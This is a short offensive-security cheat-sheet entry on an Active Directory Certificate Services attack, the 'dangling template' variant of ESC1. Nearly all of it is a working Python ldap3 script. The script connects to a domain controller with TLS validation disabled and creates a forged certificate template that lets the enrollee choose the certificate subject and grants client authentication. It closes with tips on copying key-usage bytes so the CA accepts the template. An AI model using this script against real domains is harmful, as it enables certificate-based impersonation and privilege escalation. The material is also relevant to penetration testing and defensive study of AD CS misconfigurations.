🌳 Dangling Template (Custom ESC1)

CA trusts template names that don't exist as AD objects → create the template with ESC1 flags.

PYTHONldap3 approach
# Prerequisites: CreateChild on Templates container
import ldap3, ssl

tls = ldap3.Tls(validate=ssl.CERT_NONE)
server = ldap3.Server(DC_IP, port=636, use_ssl=True, tls=tls)
conn = ldap3.Connection(server, user='domain\\user', password=PASS, authentication=ldap3.NTLM, auto_bind=True)

# Get OID prefix from existing template first!
conn.search(TEMPLATES_DN, '(cn=User)', attributes=['msPKI-Cert-Template-OID','pKIKeyUsage','pKIExpirationPeriod','pKIOverlapPeriod'])
src = conn.entries[0]

attrs = {
    'objectClass': ['top', 'pKICertificateTemplate'],
    'cn': 'TemplateName',        # Must match CA whitelist
    'msPKI-Cert-Template-OID': FOREST_OID + '.1.99',
    'msPKI-Certificate-Name-Flag': 1,  # ENROLLEE_SUPPLIES_SUBJECT
    'msPKI-Enrollment-Flag': 0,
    'msPKI-RA-Signature': 0,
    'pKIExtendedKeyUsage': ['1.3.6.1.5.5.7.3.2'],
    'pKIKeyUsage': src['pKIKeyUsage'].raw_values[0],  # CRITICAL!
    'pKIExpirationPeriod': src['pKIExpirationPeriod'].raw_values[0],
    'pKIOverlapPeriod': src['pKIOverlapPeriod'].raw_values[0],
    'pKIDefaultKeySpec': 1,
    'msPKI-Minimal-Key-Size': 2048,
    'revision': 3, 'flags': 66106,
}
conn.add(NEW_TEMPLATE_DN, attributes=attrs)
🚨
Critical: pKIKeyUsage must be set!
Copy raw bytes from existing template. Missing this = CA rejects template every time.
